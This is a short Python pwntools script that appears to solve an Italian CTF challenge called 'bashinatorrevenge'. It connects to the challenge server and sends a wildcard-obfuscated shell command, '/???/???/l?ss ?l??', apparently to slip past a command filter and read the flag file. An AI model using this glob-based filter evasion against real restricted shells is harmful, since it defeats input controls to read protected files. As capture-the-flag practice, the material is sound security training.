from pwn import remote

r = remote('bashinatorrevenge.challs.olicyber.it', 38053)

r.sendlineafter(b'$', b"/???/???/l?ss ?l??")
print(r.recvline().strip().decode())

r.close()
